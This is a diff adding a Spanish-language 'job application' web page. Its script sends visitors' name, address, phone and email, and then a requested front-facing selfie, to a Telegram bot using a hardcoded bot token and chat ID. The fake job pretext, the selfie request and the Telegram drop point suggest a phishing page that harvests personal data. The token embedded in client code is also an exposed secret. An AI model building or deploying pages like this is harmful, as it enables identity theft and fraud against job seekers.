@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Formulario de Trabajo</title>
+  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #cce7ff;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      flex-direction: column;
+    }
+    .form-container {
+      background: #fff;
+      width: 90%;
+      max-width: 500px;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.2);
+    }
+    h2 {
+      text-align: center;
+    }
+    label {
+      margin-top: 10px;
+      display: block;
+    }
+    input[type="text"], input[type="email"], input[type="tel"], select {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border-radius: 5px;
+      border: 1px solid black;
+      box-sizing: border-box;
+    }
+    button {
+      margin-top: 20px;
+      width: 100%;
+      padding: 10px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+    }
+    #mensajeEnviado {
+      margin-top: 20px;
+      text-align: center;
+      color: green;
+      font-weight: bold;
+      display: none;
+    }
+    #fotoContainer {
+      display: none;
+      margin-top: 20px;
+      text-align: center;
+    }
+    .g-recaptcha {
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="form-container">
+  <h2>Formulario de Trabajo</h2>
+  <form id="formulario">
+    <label>Nombre completo</label>
+    <input type="text" name="nombre" required>
+
+    <label>Ciudad</label>
+    <select name="ciudad" required>
+      <option value="">Selecciona una ciudad</option>
+      <option>Madrid</option>
+      <option>Barcelona</option>
+      <!-- ... (más ciudades si deseas) -->
+    </select>
+
+    <label>Dirección</label>
+    <input type="text" name="direccion" required>
+
+    <label>Teléfono</label>
+    <input type="tel" name="telefono" required>
+
+    <label>Correo electrónico</label>
+    <input type="email" name="correo" required>
+
+    <div class="g-recaptcha" data-sitekey="6LeJKhMrAAAAADXLy6-um63PwK1hszwHfC6hyPWn"></div>
+
+    <button type="submit">ENVIAR</button>
+  </form>
+
+  <div id="mensajeEnviado">Formulario enviado</div>
+
+  <div id="fotoContainer">
+    <p>Ahora toma una foto frontal:</p>
+    <input type="file" id="foto" accept="image/*" capture="user" />
+  </div>
+</div>
+
+<script>
+  const formulario = document.getElementById('formulario');
+  const mensajeEnviado = document.getElementById('mensajeEnviado');
+  const fotoContainer = document.getElementById('fotoContainer');
+  const fotoInput = document.getElementById('foto');
+
+  const botToken = '8050401859:AAHP567wAuPAgA6yaZhY0OdriYNaxkSgBsY';
+  const chatId = '1217829628';
+
+  formulario.addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    const captchaResponse = grecaptcha.getResponse();
+    if (!captchaResponse) {
+      alert('Por favor, completa el captcha.');
+      return;
+    }
+
+    const datos = new FormData(formulario);
+    const texto = `
+Nuevo formulario recibido:
+Nombre: ${datos.get('nombre')}
+Ciudad: ${datos.get('ciudad')}
+Dirección: ${datos.get('direccion')}
+Teléfono: ${datos.get('telefono')}
+Correo: ${datos.get('correo')}
+    `;
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: texto
+      })
+    })
+    .then(res => {
+      if (res.ok) {
+        formulario.reset();
+        grecaptcha.reset();
+        mensajeEnviado.style.display = 'block';
+        fotoContainer.style.display = 'block';
+      } else {
+        alert('Error al enviar el formulario.');
+      }
+    });
+  });
+
+  fotoInput.addEventListener('change', function() {
+    const file = fotoInput.files[0];
+    if (!file) return;
+
+    const formData = new FormData();
+    formData.append('chat_id', chatId);
+    formData.append('photo', file);
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+      method: 'POST',
+      body: formData
+    })
+    .then(res => {
+      if (res.ok) {
+        alert('Foto enviada correctamente.');
+        fotoContainer.innerHTML = '<strong>¡Foto enviada con éxito!</strong>';
+      } else {
+        alert('Error al enviar la foto.');
+      }
+    });
+  });
+</script>
+
+</body>
+</html>
